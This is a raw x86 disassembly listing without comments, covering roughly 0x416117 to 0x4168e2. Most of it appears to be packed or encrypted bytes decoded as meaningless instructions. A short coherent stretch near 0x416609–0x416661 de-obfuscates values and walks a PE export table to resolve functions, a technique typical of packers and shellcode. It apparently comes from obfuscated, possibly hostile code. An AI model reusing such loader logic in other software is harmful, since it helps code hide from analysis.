  416117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416118:	inc    ebp
  416119:	add    esp,esi
  41611b:	not    BYTE PTR [ebx]
  41611d:	ins    DWORD PTR es:[edi],dx
  41611e:	push   es
  41611f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416120:	call   0x22ed73cf
  416125:	imul   esi,DWORD PTR [eax-0x7d],0x45dfe9e
  41612c:	(bad)  
  41612d:	mov    esi,0x42e05829
  416132:	inc    esp
  416133:	popa   
  416134:	outs   dx,DWORD PTR ds:[esi]
  416135:	dec    esi
  416136:	repnz in al,dx
  416138:	int3   
  416139:	mov    edx,0x70f5f6c7
  41613e:	mov    esp,0xebc9a1b9
  416143:	sub    al,0x8b
  416145:	sbb    DWORD PTR [edx],ecx
  416147:	(bad)  [eax+edx*1-0x14]
  41614b:	call   0x2536f3a4
  416150:	mov    ebx,0x85a2f4e2
  416155:	jb     0x416110
  416157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416158:	or     DWORD PTR [ecx+0x4a],0x88581e9e
  41615f:	lods   al,BYTE PTR ds:[esi]
  416160:	clc    
  416161:	test   eax,0x48663bf1
  416166:	xor    dh,BYTE PTR [esp+edi*2-0x47e6e888]
  41616d:	adc    DWORD PTR [ebp+0x49],0x1621b3b8
  416174:	adc    eax,0x31863082
  416179:	sbb    BYTE PTR [ecx],dl
  41617b:	mov    esi,0x7d05451
  416180:	jbe    0x41617b
  416182:	mov    ds:0xc26e0c25,al
  416187:	inc    esp
  416188:	cld    
  416189:	mov    eax,ds:0xf6c6de45
  41618e:	push   esi
  41618f:	xor    ebp,DWORD PTR [ebx+eiz*1+0x2dc8dc6d]
  416196:	jl     0x416147
  416198:	int3   
  416199:	(bad)  
  41619b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41619c:	retf   0xef67
  41619f:	push   ss
  4161a0:	lds    esi,FWORD PTR [edi+ebx*4-0x3c]
  4161a4:	shr    BYTE PTR [edx],cl
  4161a6:	or     eax,0x3951cd37
  4161ab:	mov    ds:0xff2bcff7,al
  4161b0:	add    BYTE PTR fs:[ecx-0x7d],0x12
  4161b5:	ss jb  0x4161a3
  4161b8:	out    dx,eax
  4161b9:	sbb    ecx,esp
  4161bb:	and    al,0xad
  4161bd:	test   eax,0xab8afc46
  4161c2:	popa   
  4161c3:	fwait
  4161c4:	sub    BYTE PTR [ebp+edi*2+0x5e],0x63
  4161c9:	sub    eax,0xeb7539fc
  4161ce:	cld    
  4161cf:	adc    DWORD PTR [ebp-0x55fe132c],eax
  4161d5:	(bad)  
  4161d6:	jp     0x4161ef
  4161d8:	mov    eax,ds:0x93ec27c
  4161dd:	push   ebx
  4161de:	sti    
  4161df:	jp     0x4161e9
  4161e1:	sub    esi,eax
  4161e3:	mov    ecx,0x2d83ebaa
  4161e8:	jne    0x416241
  4161ea:	push   es
  4161eb:	fadd   QWORD PTR [esi]
  4161ed:	add    al,0xd4
  4161ef:	(bad)  
  4161f0:	loopne 0x416206
  4161f2:	sbb    eax,0x12eabdd8
  4161f7:	push   esi
  4161f8:	or     DWORD PTR [edx],0x5e9f39f4
  4161fe:	repnz lahf 
  416200:	push   cs
  416201:	and    DWORD PTR ds:0xa5dfa3f5,edx
  416207:	mov    es,WORD PTR [ecx]
  416209:	dec    ebp
  41620a:	inc    esp
  41620b:	in     eax,dx
  41620c:	int    0x4e
  41620e:	and    BYTE PTR [eax],0x8
  416211:	jecxz  0x4161f8
  416213:	popf   
  416214:	inc    eax
  416215:	stos   BYTE PTR es:[edi],al
  416216:	or     BYTE PTR [ecx-0x7ae28d6f],al
  41621c:	cmc    
  41621d:	jnp    0x41623a
  41621f:	push   ss
  416220:	out    dx,al
  416221:	data16 jecxz 0x41622f
  416224:	cwde   
  416225:	out    dx,eax
  416226:	bound  edi,QWORD PTR [esi]
  416228:	loopne 0x4161cf
  41622a:	ret    
  41622b:	nop
  41622c:	and    ah,ch
  41622e:	loop   0x4161e6
  416230:	cli    
  416231:	sub    BYTE PTR [ecx],0x12
  416234:	adc    eax,0x20e98a59
  416239:	lea    ebx,[eax+0x24696c3b]
  41623f:	pop    eax
  416240:	js     0x416243
  416242:	(bad)  
  416243:	xchg   esp,eax
  416244:	jge    0x4161ed
  416246:	add    edx,DWORD PTR [ebx]
  416248:	into   
  416249:	xor    ah,dh
  41624b:	rol    BYTE PTR [ecx-0x35],cl
  41624e:	add    eax,0x557e312
  416253:	sbb    BYTE PTR [edx],dl
  416255:	cmp    BYTE PTR [esi-0x63a17acf],bh
  41625b:	int    0x93
  41625d:	and    BYTE PTR [ecx-0x5e],dh
  416260:	jbe    0x41620c
  416262:	loopne 0x416225
  416264:	mov    esi,DWORD PTR [ebp-0x48ea75ef]
  41626a:	scas   al,BYTE PTR es:[edi]
  41626b:	sbb    al,0xb6
  41626d:	lods   eax,DWORD PTR ds:[esi]
  41626e:	pop    es
  41626f:	xor    esp,DWORD PTR [eax+eiz*8+0x60]
  416273:	out    dx,eax
  416274:	xor    dh,BYTE PTR [edx]
  416276:	addr16 jmp 0x4162a3
  416279:	mov    eax,0x2485c445
  41627e:	sub    DWORD PTR [edx],0x5329e558
  416284:	lahf   
  416285:	daa    
  416286:	(bad)  
  416287:	xor    ecx,ecx
  416289:	data16 sub BYTE PTR ds:[ecx-0x7d39ad90],bl
  416291:	rol    BYTE PTR [ecx],0x9a
  416294:	jle    0x4162b8
  416296:	dec    ebx
  416297:	popa   
  416298:	(bad)  
  416299:	xor    al,0x98
  41629b:	in     eax,dx
  41629c:	xlat   BYTE PTR ds:[ebx]
  41629d:	nop
  41629e:	xlat   BYTE PTR ds:[ebx]
  41629f:	jno    0x41623f
  4162a1:	jno    0x416271
  4162a3:	xchg   esp,eax
  4162a4:	sbb    DWORD PTR [eax+0x79],esp
  4162a7:	cmp    al,BYTE PTR [esi+ecx*8]
  4162aa:	cs pop ss
  4162ac:	dec    ecx
  4162ad:	push   0x4d
  4162af:	xor    DWORD PTR [edi+0x22],edi
  4162b2:	nop
  4162b3:	mov    edi,0x3e6bf81d
  4162b8:	mov    ah,BYTE PTR [ecx]
  4162ba:	cld    
  4162bb:	dec    ebx
  4162bc:	sahf   
  4162bd:	mov    ds:0xa4c7e634,al
  4162c2:	ja     0x416264
  4162c4:	cmc    
  4162c5:	and    eax,0x84209a43
  4162ca:	pop    edi
  4162cb:	xchg   esi,eax
  4162cc:	cmp    ch,al
  4162ce:	mov    ebp,0x93d7d5f9
  4162d3:	sbb    ch,BYTE PTR [edx-0x5e]
  4162d6:	jmp    0xc2d4:0x857f4412
  4162dd:	mov    WORD PTR [edx-0x5102bfa4],?
  4162e3:	push   0xb13a4c28
  4162e8:	call   0x59600b7a
  4162ed:	sti    
  4162ee:	arpl   WORD PTR [esi-0x4a916f12],dx
  4162f4:	push   eax
  4162f5:	adc    eax,0x27cb3da1
  4162fa:	xchg   ebp,eax
  4162fb:	aam    0x3
  4162fd:	inc    ebx
  4162fe:	sub    ebx,ecx
  416300:	and    dh,BYTE PTR fs:[edx-0x4c7051cc]
  416307:	mov    edx,0xd099b691
  41630c:	int3   
  41630d:	into   
  41630e:	out    dx,eax
  41630f:	cld    
  416310:	cli    
  416311:	gs sbb al,0x52
  416314:	mov    DWORD PTR [ebx+edx*4],ecx
  416317:	cwde   
  416318:	push   ss
  416319:	fwait
  41631a:	and    esp,DWORD PTR [edx]
  41631c:	aam    0x7c
  41631e:	in     eax,0x47
  416320:	push   0xc67053a2
  416325:	fwait
  416326:	pop    edx
  416327:	pusha  
  416328:	(bad)  
  416329:	mov    dl,0x22
  41632b:	pushf  
  41632c:	jne    0x416342
  41632e:	mov    ebx,0x95df12ed
  416333:	fwait
  416334:	inc    eax
  416335:	jns    0x4162c7
  416337:	adc    eax,0x89151d27
  41633c:	jns    0x4163ac
  41633e:	fsubrp st(2),st
  416340:	or     BYTE PTR [esi-0x36df4f20],0x41
  416347:	and    DWORD PTR [ecx],esp
  416349:	cld    
  41634a:	xchg   DWORD PTR [ebx+0x3aa2d816],ecx
  416350:	mov    edi,ebp
  416352:	add    ebx,0xffffffd1
  416355:	xchg   DWORD PTR [esi+0x2c2c7dd4],esp
  41635b:	shl    BYTE PTR [ebx+esi*4],0x66
  41635f:	out    0xe1,eax
  416361:	mov    bh,0xd2
  416363:	rcl    BYTE PTR [ebx-0x68d9b678],cl
  416369:	(bad)  
  41636b:	test   DWORD PTR [esi-0x49],ecx
  41636e:	sub    eax,0x49c6b5b7
  416373:	mov    cl,0x3a
  416375:	xchg   edx,eax
  416376:	xchg   edx,eax
  416377:	dec    esp
  416378:	lods   eax,DWORD PTR cs:[esi]
  41637a:	and    eax,0x14e3773a
  41637f:	inc    ebp
  416380:	pushf  
  416381:	ja     0x416310
  416383:	scas   al,BYTE PTR es:[edi]
  416384:	jnp    0x416334
  416386:	mov    edx,0x331bc6da
  41638b:	std    
  41638c:	pushf  
  41638d:	xlat   BYTE PTR ds:[ebx]
  41638e:	(bad)  
  41638f:	adc    ecx,edi
  416391:	sbb    eax,0x76811960
  416396:	sahf   
  416397:	repnz cli 
  416399:	dec    esi
  41639a:	sub    al,0xc
  41639c:	xlat   BYTE PTR ds:[ebx]
  41639d:	push   cs
  41639e:	xchg   esp,eax
  41639f:	enter  0x6406,0xe
  4163a3:	push   es
  4163a4:	push   ecx
  4163a5:	mov    esi,0xc946af66
  4163aa:	fyl2x  
  4163ac:	fstp   DWORD PTR [ebx+0x7b]
  4163af:	mov    BYTE PTR [eax-0x754f0109],dh
  4163b5:	sti    
  4163b6:	dec    ecx
  4163b7:	push   cs
  4163b8:	push   cs
  4163b9:	xchg   ebx,eax
  4163ba:	(bad)  
  4163bb:	stc    
  4163bc:	and    bh,BYTE PTR [eax+0x132f10fa]
  4163c2:	add    esp,DWORD PTR [edi-0x36550e89]
  4163c8:	push   esp
  4163c9:	loop   0x4163b6
  4163cb:	jle    0x416351
  4163cd:	das    
  4163ce:	fdiv   DWORD PTR [ebx+0x13]
  4163d1:	inc    ebp
  4163d2:	(bad)  
  4163d3:	cwde   
  4163d4:	ror    DWORD PTR [ebx],1
  4163d6:	ror    ah,1
  4163d8:	pop    esi
  4163d9:	and    al,0x8
  4163db:	das    
  4163dc:	enter  0x1175,0x25
  4163e0:	xor    al,BYTE PTR [ebx-0x25]
  4163e3:	fnsave [ebp+0x6a7e566e]
  4163e9:	lea    edi,[edx]
  4163eb:	cmp    edi,DWORD PTR [esi-0x5de2eda7]
  4163f1:	stos   BYTE PTR es:[edi],al
  4163f2:	inc    esp
  4163f3:	aad    0xd
  4163f5:	xchg   ebx,eax
  4163f6:	(bad)  
  4163f7:	into   
  4163f8:	sbb    eax,0xf534e020
  4163fd:	inc    esp
  4163fe:	mov    ?,WORD PTR [ebx-0x25]
  416401:	loopne 0x416394
  416403:	jg     0x416465
  416405:	mov    DWORD PTR [esi],ebp
  416407:	and    al,0x4a
  416409:	or     al,0x17
  41640b:	data16 aam 0xa4
  41640e:	enter  0x2541,0xe8
  416412:	ret    
  416413:	daa    
  416414:	add    BYTE PTR [ecx],cl
  416416:	cdq    
  416417:	sbb    cl,dl
  416419:	push   ss
  41641a:	dec    esi
  41641b:	cwde   
  41641c:	aas    
  41641d:	mov    ebx,0x63ef2864
  416422:	and    DWORD PTR [edi-0x9],ecx
  416425:	push   esi
  416426:	in     al,dx
  416427:	mov    edx,0xd14a62a5
  41642c:	addr16 inc ecx
  41642e:	jecxz  0x41643e
  416430:	push   edi
  416431:	iret   
  416432:	fidiv  WORD PTR [eax+0x6034acf1]
  416438:	add    al,0x6e
  41643a:	pop    ecx
  41643b:	in     eax,0xa8
  41643d:	int3   
  41643e:	pop    esi
  41643f:	xlat   BYTE PTR ds:[ebx]
  416440:	sbb    al,BYTE PTR ds:[ebp+esi*4+0x4bf939fe]
  416448:	ins    BYTE PTR es:[edi],dx
  416449:	sub    eax,0xb2c3d371
  41644e:	out    0x9b,eax
  416450:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416451:	fcomp  DWORD PTR [esi-0x47]
  416454:	stc    
  416455:	mov    bl,0xaa
  416457:	mov    ch,0x6a
  416459:	stos   BYTE PTR es:[edi],al
  41645a:	pop    eax
  41645b:	ret    0x743b
  41645e:	sbb    DWORD PTR [eax-0xb],esi
  416461:	adc    dh,dh
  416463:	mov    dl,ah
  416465:	push   es
  416466:	xor    DWORD PTR [eax+0x37],edi
  416469:	retf   0x3b14
  41646c:	add    ch,BYTE PTR es:[edi+0x5a]
  416470:	xchg   esp,eax
  416471:	ja     0x416475
  416473:	mov    edx,ecx
  416475:	jg     0x41648b
  416477:	scas   eax,DWORD PTR es:[edi]
  416478:	lds    ebx,FWORD PTR [esi]
  41647a:	adc    al,0x7e
  41647c:	mov    esi,0x4a727237
  416481:	dec    edx
  416482:	mov    ebp,0xd290de3b
  416487:	xlat   BYTE PTR ds:[ebx]
  416488:	cmp    DWORD PTR [edi-0x4406b7e2],ecx
  41648e:	xchg   esi,eax
  41648f:	jno    0x416433
  416491:	mov    ds:0xee9b512e,eax
  416496:	retf   0x10e1
  416499:	aas    
  41649a:	jne    0x41643f
  41649c:	loope  0x41647d
  41649e:	mov    ah,0x61
  4164a0:	or     eax,0xfedf31d1
  4164a5:	cs and eax,0xdb59b421
  4164ab:	call   0x101d99ce
  4164b0:	loop   0x416465
  4164b2:	sub    BYTE PTR [esi-0x7d],ah
  4164b5:	lds    esp,FWORD PTR [ebx+0x3b]
  4164b8:	jmp    0x41643b
  4164ba:	cli    
  4164bb:	test   BYTE PTR [ebp-0x2e],dh
  4164be:	xor    dh,ch
  4164c0:	inc    ebx
  4164c1:	or     ah,BYTE PTR [ebp+0x5f]
  4164c4:	rcl    BYTE PTR [ebx],1
  4164c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164c7:	cmp    BYTE PTR [esi-0x14],cl
  4164ca:	or     ah,cl
  4164cc:	cdq    
  4164cd:	sbb    ch,BYTE PTR ds:0xcbed1c2f
  4164d3:	cmp    eax,0x65b4873c
  4164d8:	retf   0x3f9a
  4164db:	inc    edi
  4164dc:	add    al,0x77
  4164de:	leave  
  4164df:	xor    cl,al
  4164e1:	cmp    BYTE PTR ds:[ecx],dh
  4164e4:	jno    0x4164e0
  4164e6:	test   al,0x2
  4164e8:	daa    
  4164e9:	mov    ah,0x3f
  4164eb:	pusha  
  4164ec:	jge    0x41648e
  4164ee:	jge    0x4164c1
  4164f0:	jns    0x416501
  4164f2:	push   0xf995c632
  4164f7:	push   esi
  4164f8:	pop    esi
  4164f9:	pop    es
  4164fa:	mov    cl,0x6c
  4164fc:	das    
  4164fd:	call   0xe6cdda17
  416502:	and    BYTE PTR [edi-0x4a577cdd],0x8c
  416509:	aad    0x9f
  41650b:	pop    es
  41650c:	cmc    
  41650d:	sub    al,0x6a
  41650f:	lea    edi,[ebx+edi*1]
  416512:	cmp    al,0xd6
  416514:	clc    
  416515:	inc    esi
  416516:	ret    
  416517:	sahf   
  416518:	(bad)  [ecx]
  41651a:	ss mov eax,0x84df4c83
  416520:	push   esp
  416521:	mov    ah,0x92
  416523:	cmp    ebx,ecx
  416525:	sub    al,0xb9
  416527:	leave  
  416528:	(bad)  
  416529:	push   cs
  41652a:	fimul  WORD PTR [edi+0x36923a81]
  416530:	test   DWORD PTR ds:0x47c05204,eax
  416536:	ss retf 
  416538:	sbb    al,0x5d
  41653a:	stos   BYTE PTR es:[edi],al
  41653b:	mov    ds:0x103af4ce,eax
  416540:	and    BYTE PTR ds:0xa7d2e286,0xc4
  416547:	jo     0x4164d4
  416549:	push   ebp
  41654a:	dec    eax
  41654b:	das    
  41654c:	sub    edi,DWORD PTR [ebp-0x26]
  41654f:	jns    0x41651c
  416551:	jns    0x416523
  416553:	push   cs
  416554:	aaa    
  416555:	dec    ebp
  416556:	sti    
  416557:	dec    esp
  416558:	xchg   BYTE PTR [edi-0x7b28695b],ah
  41655e:	call   0x954a:0xb88bba3d
  416565:	xor    BYTE PTR [edx+0x20a43bba],dl
  41656b:	in     al,0xc6
  41656d:	dec    edi
  41656e:	mov    bh,0x20
  416570:	(bad)  
  416571:	sub    DWORD PTR [ecx-0x32],ecx
  416574:	cli    
  416575:	stos   DWORD PTR es:[edi],eax
  416576:	push   0x85462351
  41657b:	jno    0x4165e4
  41657d:	xchg   esp,eax
  41657e:	(bad)
  416581:	fisttp QWORD PTR [ebp+edi*2-0x1d]
  416585:	jecxz  0x416535
  416587:	or     ebx,edi
  416589:	fstp   QWORD PTR [edi+0x75]
  41658c:	adc    al,0x5b
  41658e:	cmc    
  41658f:	test   eax,0xc574449e
  416594:	std    
  416595:	push   0xd9b4727a
  41659a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41659b:	sub    DWORD PTR [ebx-0x19],eax
  41659e:	mov    dl,0x2a
  4165a0:	add    DWORD PTR [eax+esi*8+0x70e20b45],edx
  4165a7:	jl     0x416626
  4165a9:	xor    esp,DWORD PTR [edx+ebp*4+0x52]
  4165ad:	dec    eax
  4165ae:	mov    eax,0xd9eea5e0
  4165b3:	je     0x41662d
  4165b5:	pusha  
  4165b6:	(bad)  
  4165b7:	loopne 0x416572
  4165b9:	or     DWORD PTR [esi+0x63b9646],edx
  4165bf:	mov    bl,0x3e
  4165c1:	cld    
  4165c2:	vpunpcklwd ymm3,ymm7,ymm7
  4165c6:	imul   ecx,DWORD PTR [ecx-0x2b],0xffffffc2
  4165ca:	cdq    
  4165cb:	push   ebx
  4165cc:	in     eax,0x6d
  4165ce:	adc    esi,esp
  4165d0:	sbb    eax,0xaaff5474
  4165d5:	sahf   
  4165d6:	add    edx,DWORD PTR [ecx+0x19d81a92]
  4165dc:	test   ah,ch
  4165de:	and    dh,BYTE PTR [esi+0x60]
  4165e1:	cdq    
  4165e2:	mov    eax,0x6bfdafff
  4165e7:	imul   ebx,ebp,0x4cae775b
  4165ed:	loop   0x4165d1
  4165ef:	mov    ebx,0xc488e7bb
  4165f4:	push   edx
  4165f5:	inc    ebp
  4165f6:	push   0xffc6e2b
  4165fb:	test   DWORD PTR [edx],esp
  4165fd:	add    BYTE PTR [eax],al
  4165ff:	add    BYTE PTR [esi+0xf],ah
  416602:	mov    esi,0x3b4bbb38
  416607:	add    BYTE PTR [eax],al
  416609:	sub    di,bx
  41660c:	mov    ebx,0x8a85
  416611:	xor    di,bx
  416614:	mov    ebx,0x4f87
  416619:	cmp    di,bx
  41661c:	je     0x416632
  416622:	mov    edi,DWORD PTR [ebp-0x10]
  416625:	xor    edi,ecx
  416627:	mov    ebx,esi
  416629:	sub    ebx,edi
  41662b:	add    eax,ebx
  41662d:	jmp    0x41421e
  416632:	mov    esi,DWORD PTR [ebp-0x14]
  416635:	mov    esi,DWORD PTR [esi]
  416637:	mov    edi,DWORD PTR [eax+0x3c]
  41663a:	lea    esi,[edi+esi*8+0x78]
  41663e:	mov    esi,DWORD PTR [esi+eax*1]
  416641:	mov    DWORD PTR [ebp-0x8],esi
  416644:	mov    esi,DWORD PTR [ebp+0x8]
  416647:	xor    esi,ecx
  416649:	add    esi,edx
  41664b:	mov    DWORD PTR [ebp-0x14],esi
  41664e:	mov    esi,DWORD PTR [ebp+0x8]
  416651:	mov    edi,DWORD PTR [ebp-0x8]
  416654:	xor    esi,ecx
  416656:	add    esi,edx
  416658:	pop    ebx
  416659:	cmp    edi,esi
  41665b:	jne    0x41adf7
  416661:	jmp    0x418a20
  416666:	fnstenv [edx-0x73]
  416669:	xchg   ebp,eax
  41666a:	gs xchg ebp,eax
  41666c:	test   eax,0x7c0e640e
  416671:	sbb    dh,BYTE PTR [esi-0x246a6239]
  416677:	and    esp,DWORD PTR [ecx+0x62]
  41667a:	rcr    BYTE PTR [edi+0x62],0x62
  41667e:	daa    
  41667f:	cmp    eax,0xe4b4f229
  416684:	out    0xb6,eax
  416686:	lahf   
  416687:	stos   DWORD PTR es:[edi],eax
  416688:	in     al,0xee
  41668a:	inc    BYTE PTR [ebx+0x4f1e2b47]
  416690:	sub    eax,0xe66f3801
  416695:	nop
  416696:	popf   
  416697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416698:	fld    DWORD PTR [edi-0x29]
  41669b:	in     eax,dx
  41669c:	and    bl,BYTE PTR [ebx]
  41669e:	inc    ebp
  41669f:	int3   
  4166a0:	mov    ebp,DWORD PTR [eax-0x58]
  4166a3:	xchg   BYTE PTR [edx-0x20],dh
  4166a6:	pop    ss
  4166a7:	das    
  4166a8:	mov    bh,0x6c
  4166aa:	mov    dh,0xd5
  4166ac:	dec    edx
  4166ad:	test   cl,ah
  4166af:	jecxz  0x4166c8
  4166b1:	ret    0x8e44
  4166b4:	loop   0x416652
  4166b6:	in     eax,0x7a
  4166b8:	push   esi
  4166b9:	mov    ch,0xf9
  4166bb:	xor    ah,BYTE PTR ds:0x194c6df7
  4166c1:	loop   0x4166e3
  4166c3:	ins    BYTE PTR es:[edi],dx
  4166c4:	pop    ecx
  4166c5:	mov    ch,0xbb
  4166c7:	adc    BYTE PTR [esi-0x98df504],0x3a
  4166ce:	in     eax,dx
  4166cf:	test   DWORD PTR [esi-0x6f8415b3],0xcd186dd3
  4166d9:	(bad)  
  4166da:	fdivr  DWORD PTR [edi+0x1e]
  4166dd:	ret    
  4166de:	popa   
  4166df:	pop    esi
  4166e0:	xor    DWORD PTR [eax-0x62],esi
  4166e3:	pop    ebp
  4166e4:	jg     0x416681
  4166e6:	add    esp,ebp
  4166e8:	int    0xbc
  4166ea:	push   esp
  4166eb:	test   DWORD PTR [eax-0x319c77b6],eax
  4166f1:	ins    BYTE PTR es:[edi],dx
  4166f2:	ror    ah,1
  4166f4:	in     al,dx
  4166f5:	ins    BYTE PTR es:[edi],dx
  4166f6:	add    edx,0xffffffeb
  4166f9:	add    al,0x22
  4166fb:	mov    ecx,gs
  4166fd:	add    ecx,edx
  4166ff:	push   esi
  416700:	les    edx,FWORD PTR [ebx]
  416702:	sbb    ecx,ecx
  416704:	outs   dx,BYTE PTR ds:[esi]
  416705:	push   es
  416706:	mov    bl,0x44
  416708:	mov    dh,0xe9
  41670a:	fwait
  41670b:	imul   ecx,ebp,0xeef48c8b
  416711:	jl     0x4166f4
  416713:	lea    ebx,[eax-0x29]
  416716:	xlat   BYTE PTR ds:[ebx]
  416717:	outs   dx,DWORD PTR ds:[esi]
  416718:	(bad)  
  416719:	fisttp DWORD PTR [eax+0x23560c96]
  41671f:	mov    cl,cl
  416721:	and    esi,DWORD PTR [ecx]
  416723:	and    ah,BYTE PTR [esi-0x80]
  416726:	(bad)  
  416727:	dec    edi
  416728:	sub    DWORD PTR [edx],ecx
  41672a:	inc    ebx
  41672b:	dec    esp
  41672c:	aam    0xc3
  41672e:	or     BYTE PTR [ebp+edx*1-0x60],dl
  416732:	fwait
  416733:	bound  edi,QWORD PTR [esi+0x3be3ba87]
  416739:	in     eax,dx
  41673a:	sbb    ch,BYTE PTR [edx+0x4f]
  41673d:	leave  
  41673e:	fistp  QWORD PTR ds:0xad7534a1
  416744:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416745:	mov    edi,0x1df90c5d
  41674a:	in     eax,dx
  41674b:	and    bh,cl
  41674d:	retf   0x9ff0
  416750:	stos   BYTE PTR es:[edi],al
  416751:	and    ah,ch
  416753:	fs inc esi
  416755:	ret    
  416756:	test   DWORD PTR [eax],0xe7939c1a
  41675c:	add    edi,DWORD PTR [edx+0x22]
  41675f:	loopne 0x416773
  416761:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416762:	pop    ecx
  416763:	jle    0x416763
  416765:	add    DWORD PTR [esi],esp
  416767:	stos   DWORD PTR es:[edi],eax
  416768:	xor    ecx,DWORD PTR [ebx]
  41676a:	or     al,0x47
  41676c:	pop    esp
  41676d:	push   ss
  41676e:	xchg   ecx,eax
  41676f:	jl     0x41676f
  416771:	leave  
  416772:	mov    bh,0x69
  416774:	lahf   
  416775:	stos   BYTE PTR es:[edi],al
  416776:	mov    eax,0xed1518ed
  41677b:	imul   ecx,eax,0x7a405e6f
  416781:	inc    ebp
  416782:	and    al,BYTE PTR [ebx+ecx*2]
  416785:	sub    ecx,DWORD PTR [ebx+0x33675cc7]
  41678b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41678c:	mov    al,0xe9
  41678e:	adc    eax,edi
  416790:	push   edx
  416791:	out    0xdf,eax
  416793:	mov    dl,0x23
  416795:	aam    0x42
  416797:	sbb    edi,ecx
  416799:	sahf   
  41679a:	sub    al,0x37
  41679c:	inc    ebx
  41679d:	push   edx
  41679e:	clc    
  41679f:	repz xor ecx,DWORD PTR [di-0x71bb]
  4167a5:	repz xor dl,BYTE PTR [edx+0x25e88b82]
  4167ac:	push   edx
  4167ad:	add    eax,0x61cc1a49
  4167b2:	xor    BYTE PTR [edi-0x2d],cl
  4167b5:	fnclex 
  4167b7:	ja     0x416773
  4167b9:	jns    0x4167c5
  4167bb:	iret   
  4167bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167bd:	xor    BYTE PTR [esi],0xf7
  4167c0:	mov    ah,0xf
  4167c2:	jge    0x416759
  4167c4:	mov    al,ds:0xe6c108ce
  4167c9:	daa    
  4167ca:	sbb    al,0xfa
  4167cc:	cmp    al,BYTE PTR [eax+0x20b44af5]
  4167d2:	push   esp
  4167d3:	pop    ebp
  4167d4:	mov    esp,0xa3f88b3c
  4167d9:	mov    bl,0x24
  4167db:	push   ecx
  4167dc:	(bad)  
  4167dd:	popf   
  4167de:	jle    0x4167cc
  4167e0:	sbb    ebx,esi
  4167e2:	jb     0x416827
  4167e4:	push   0x5bfc7976
  4167e9:	xchg   ebx,eax
  4167ea:	xchg   esi,eax
  4167eb:	xor    eax,edx
  4167ed:	(bad)  
  4167ee:	jbe    0x4167d3
  4167f0:	in     eax,dx
  4167f1:	dec    eax
  4167f2:	retf   0xa4fb
  4167f5:	clc    
  4167f6:	inc    esp
  4167f7:	imul   ecx,DWORD PTR [ebp-0x687b83c5],0x56
  4167fe:	sbb    eax,ecx
  416800:	cmp    edx,ebp
  416802:	lods   al,BYTE PTR ds:[esi]
  416803:	cmp    BYTE PTR [ecx+edx*4+0x41f00446],ch
  41680a:	xlat   BYTE PTR ds:[ebx]
  41680b:	cmc    
  41680c:	mov    ?,esp
  41680e:	and    al,cl
  416810:	jno    0x416812
  416812:	pop    esi
  416813:	jle    0x4167df
  416815:	ficomp WORD PTR [edi]
  416817:	add    ah,dh
  416819:	hlt    
  41681a:	pop    ebp
  41681b:	lea    edx,[edi]
  41681d:	inc    eax
  41681e:	rol    DWORD PTR [edi+0x50949f6],0xba
  416825:	mov    esp,0x951bd7ee
  41682a:	xchg   ecx,eax
  41682b:	int    0xcb
  41682d:	xor    bh,al
  41682f:	test   eax,0xea464645
  416834:	mov    dh,0xfd
  416836:	or     ah,BYTE PTR [esi+ebp*4+0x4ddd8644]
  41683d:	push   es
  41683e:	ror    DWORD PTR [edx-0x7b],cl
  416841:	bound  ecx,QWORD PTR [edi+0x346d9cf6]
  416847:	add    DWORD PTR [edi+0x5e],ebp
  41684a:	popf   
  41684b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41684c:	xchg   DWORD PTR [ecx],edx
  41684e:	test   BYTE PTR [ebp+0x3d834b29],0x1
  416855:	out    0x83,eax
  416857:	sub    edi,0x7e
  41685a:	(bad)  
  41685b:	push   edi
  41685c:	push   cs
  41685d:	scas   eax,DWORD PTR es:[edi]
  41685e:	aad    0xe7
  416860:	out    dx,al
  416861:	js     0x416877
  416863:	push   0x620f5750
  416868:	ins    BYTE PTR es:[edi],dx
  416869:	xchg   esi,eax
  41686a:	jne    0x416858
  41686c:	dec    ecx
  41686d:	dec    eax
  41686e:	cmp    al,0x1d
  416870:	aad    0xd7
  416872:	std    
  416873:	mov    bh,0x36
  416875:	pop    ebp
  416876:	das    
  416877:	jne    0x4168ed
  416879:	dec    edx
  41687a:	sub    al,0x44
  41687c:	adc    al,0x99
  41687e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41687f:	dec    ecx
  416880:	les    eax,FWORD PTR [ebp+edx*2+0x5d]
  416884:	fs (bad) 
  416886:	adc    DWORD PTR [eax-0x33],ebp
  416889:	daa    
  41688a:	sub    eax,DWORD PTR [edi]
  41688c:	inc    eax
  41688d:	xlat   BYTE PTR ds:[ebx]
  41688e:	ficom  DWORD PTR [esi-0x13b1e364]
  416894:	stc    
  416895:	cmp    DWORD PTR [ecx-0x7f],esp
  416898:	ret    
  416899:	ja     0x41681d
  41689b:	push   es
  41689c:	sbb    BYTE PTR [ebx+0x72],dh
  41689f:	add    eax,DWORD PTR [edx+0x3b]
  4168a2:	mov    esp,DWORD PTR [eax-0x2f1b2835]
  4168a8:	psubq  mm1,QWORD PTR [edx+0x39]
  4168ac:	and    cl,BYTE PTR [edi-0x18e4d500]
  4168b2:	or     eax,0xfa59d775
  4168b7:	outs   dx,DWORD PTR ds:[esi]
  4168b8:	mov    DWORD PTR [eax+0x56],ecx
  4168bb:	retf   0x5443
  4168be:	das    
  4168bf:	sub    eax,0x850f4d6a
  4168c4:	inc    ebx
  4168c5:	xchg   esi,eax
  4168c6:	rcr    DWORD PTR [eax-0x2e],0x40
  4168ca:	push   esi
  4168cb:	aam    0xc8
  4168cd:	out    0xdd,eax
  4168cf:	pop    esi
  4168d0:	xchg   esp,eax
  4168d1:	cmp    eax,0x64ad88d
  4168d6:	inc    ebp
  4168d7:	add    al,0x51
  4168d9:	std    
  4168da:	cmp    BYTE PTR [ebx],bl
  4168dc:	fist   WORD PTR [esi+0x75039671]
  4168e2:	test   al,0x62
